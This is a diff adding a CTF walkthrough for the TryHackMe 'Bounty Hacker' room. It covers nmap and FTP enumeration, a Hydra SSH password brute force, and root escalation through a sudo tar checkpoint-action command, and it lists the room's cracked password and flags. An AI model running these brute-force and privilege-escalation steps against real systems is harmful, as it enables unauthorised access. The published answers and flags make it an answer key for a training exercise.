@@ -1,0 +1,140 @@
+# TRY HACK ME
+
+## ROOM [ Bounty Hacker ]
+
+---
+
+### Step 1 : Deploy the Machine
+
+Start the machine from TryHackMe and connect VPN using OpenVPN.
+
+sudo apt install openvpn
+
+sudo openvpn <file-name>.ovpn
+
+Wait until machine IP is assigned.
+
+---
+
+### Step 2 : Reconnaissance (Nmap Scan)
+
+We scan the target to find open ports and services.
+
+nmap -A -Pn -T5 <IP>
+
+Findings:
+- FTP
+- SSH
+- HTTP (if available depending on target state)
+
+---
+
+### Step 3 : FTP Enumeration
+
+We connect to FTP to explore files.
+
+ftp <IP>
+
+Inside FTP we find:
+- locks.txt
+- task.txt
+
+From task.txt we identify the author.
+
+---
+
+### Question: Who wrote the task list?
+Answer: Lin
+
+---
+
+### Step 4 : Identify Attack Surface
+
+From enumeration we find username list and password list.
+
+We understand SSH is the service we can brute force.
+
+---
+
+### Question: What service can you brute force with the text file found?
+Answer: SSH
+
+---
+
+### Step 5 : Brute Force SSH Password
+
+We use Hydra to crack SSH credentials.
+
+hydra ssh://<IP> -L task.txt -P locks.txt
+
+Result:
+- Username: lin
+- Password: RedDr4gonSynd1cat3
+
+---
+
+### Question: What is the users password?
+Answer: RedDr4gonSynd1cat3
+
+---
+
+### Step 6 : SSH Login
+
+Login using credentials:
+
+ssh lin@<IP>
+
+After login, we retrieve user flag.
+
+cat user.txt
+
+---
+
+### USER FLAG
+
+THM{CR1M3_SyNd1C4T3}
+
+---
+
+### Step 7 : Privilege Escalation
+
+We check sudo permissions:
+
+sudo -l
+
+We find that /bin/tar can be run as root.
+
+---
+
+### Step 8 : GTFOBins Privilege Escalation
+
+Using GTFOBins method for tar:
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+Now we get root shell.
+
+---
+
+### Step 9 : Root Flag
+
+cat /root/root.txt
+
+---
+
+### ROOT FLAG
+
+THM{80UN7Y_h4cK3r}
+
+---
+
+### Final Answers Summary
+
+- Who wrote task list: Lin
+- Brute force service: SSH
+- Password: RedDr4gonSynd1cat3
+- user.txt: THM{CR1M3_SyNd1C4T3}
+- root.txt: THM{80UN7Y_h4cK3r}
+
+---
+
